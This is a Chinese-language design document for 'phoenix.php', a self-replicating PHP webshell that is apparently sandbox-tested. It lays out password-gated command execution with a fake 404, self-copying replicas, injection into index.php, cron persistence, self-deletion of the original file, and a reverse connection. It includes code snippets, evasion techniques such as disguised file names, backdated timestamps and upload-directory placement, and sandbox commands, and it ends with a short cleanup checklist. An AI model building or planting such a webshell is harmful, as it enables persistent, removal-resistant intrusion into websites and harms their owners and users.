# WebShell 自愈(不死马/Phoenix)完整设计与清理流程

2026-08-12 本地沙盒实测通过的 PHP 自愈 webshell 设计。产物: `D:\渗透\tools\phoenix_shell\phoenix.php`(v3.0, 14901 chars) + 本机 PHP 8.3 CLI 沙盒。

## 架构

```
phoenix.php (母体 - 一次性注入)
├─ 密码认证(参数 x= 或 Cookie phx=, 失败返回 404 伪装)
├─ 落地即繁殖: 多副本 + 宿主注入 + cron 保活
├─ 母体自毁(首次访问后自我删除, 只留副本)
└─ 功能: 命令执行/文件管理/数据库连接/反连
副本层(删了会重生)
├─ 副本自带繁殖核心: 副本数 < 4 自动补种(删一个长一个)
└─ 宿主 index.php 注入内联繁殖器: 全副本被删后 index.php?phx_load=PASS 重生
```

## 关键实现决策(踩坑后验证)

### 1. 副本模板用 base64 内嵌,不用复杂字符串拼接
```php
$__TPL = base64_decode('PD9waHAgLyogcGh4...');
function __copy_body() { global $__PASS, $__TPL; return str_replace('PLPASS', $__PASS, $__TPL); }
```
- 避免多层引号/花括号拼接导致 Parse error
- 顺带实现静态混淆(明文 payload 不在母体出现)

### 2. 双层模板实现"副本也能繁殖"
- 副本内容 = 模板(内含 `base64_decode('__B64__')` 指向**孙子模板**)
- 生成流程: 内层 b64 = 模板.replace(PLPASS) 的 base64 → 外层模板把 `__B64__` 换成内层 b64 → 母体 `$__TPL = base64_decode(外层b64)`
- 副本存活 < 4 时自己补种, 无需母体

### 3. 宿主注入必须处理 PHP 结束标签
```php
/* 错误方案1: ?> 之后追加代码 → 被当纯文本输出(不执行) */
/* 错误方案2: preg_replace('/\?>\s*$/','',$c) 剥掉 ?> 再追加 <?php → Parse error(unexpected token "<") */
/* 正确方案: 保留 ?> 并在其后追加新的 <?php ... ?> 块 */
```

### 4. 注释陷阱(词法器级)
- 注释里写字面 `<?php` → 开启新 PHP 模式 → 后面字符串中 `?>` 提前结束块
- 块注释里写 `/*phx*/` → 内层 `*/` 提前关闭外层注释
- 一律用"phx 标记 / PHP 开始标签"等文字描述代替字面量

### 5. 扩展名
- `.php5`/`.phtml` 在 PHP 内置服务器与部分 nginx 配置下**不当 PHP 解析**(访问吐源码)
- 副本扩展名权重: php:php:php:phtml(75% php)

### 6. 伪装
- 随机文件名: cache_/session_/temp_/log_ + md5 8 位 + .php
- `touch($path, time()-mt_rand(30,400)*86400)` 时间戳伪装成 30-400 天前
- 繁殖位置: web 根/uploads/upload/images/static/public/wp-content/uploads/data/cache/tmp/sys_temp/session 目录/当前目录

### 7. 母体自毁
```php
@unlink($self);
if (file_exists($self)) register_shutdown_function(function() use ($self) { @unlink($self); });
```
Windows 下文件被占用时用 shutdown 函数延迟删。

## 沙盒验证流程(本机 PHP CLI)

```bash
# 1. 下载 PHP CLI (windows.php.net 最新 8.3 nts x64 zip)
curl -sL -o php83.zip "https://windows.php.net/downloads/releases/php-8.3.33-nts-Win32-vs16-x64.zip"
unzip -o -q php83.zip -d php83
# 2. 语法检查
php83/php.exe -l phoenix.php
# 3. 沙盒
mkdir -p sandbox/web/uploads sandbox/web/images sandbox/web/cache
echo '<?php echo "site index"; ?>' > sandbox/web/index.php
php83/php.exe -S 127.0.0.1:8899 -t sandbox/web   # 后台启动
# 4. 验证序列
curl -s "http://127.0.0.1:8899/phoenix.php?x=PASS&c=whoami"   # 繁殖+自毁
find sandbox/web -name "*.php"                                 # 找副本
curl -s "http://127.0.0.1:8899/<副本>?x=PASS&c=whoami"          # 副本命令执行
# 5. 不死测试: 删全部副本(保留注入的 index.php) → 触发宿主重生
curl -s "http://127.0.0.1:8899/index.php?phx_load=PASS&c=whoami"
```

## 清理流程(卸载不死鸟)

1. `act=kill` 删已知副本(母体内置 kill 动作)
2. `find / -name "*.php" -newermt "2026-01-01"` 找新文件
3. 检查 index.php 尾部 phx 标记注入段并还原
4. `crontab -l` 删除 phx 相关行
5. `grep -rl "phx" /var/www/` 全站搜残留
6. 修复被篡改文件时间戳
